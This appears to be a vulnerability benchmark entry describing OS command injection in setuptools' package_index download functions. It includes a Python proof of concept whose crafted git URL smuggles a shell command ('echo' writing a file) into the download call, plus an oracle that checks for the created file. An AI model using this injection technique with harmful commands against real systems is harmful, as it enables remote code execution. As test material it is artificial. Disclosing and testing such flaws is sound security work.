title: Remote code execution via code injection in download functions of setuptools package_index module
cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
trigger_payload:
from setuptools.package_index import (PackageIndex, parse_requirement_arg, URL_SCHEME)
package_index = PackageIndex()
url = "git://example.net/package-a.git; echo 'hello' > good@main#egg=Package-A" # P
print(f"Fetching url: \"{url}\"")
print("Observe the new file created (named 'good@main') in the current directory.\n")
package_index.download(url, '/tmp/testing')
oracle: a new file named 'good@main' is created in the current directory
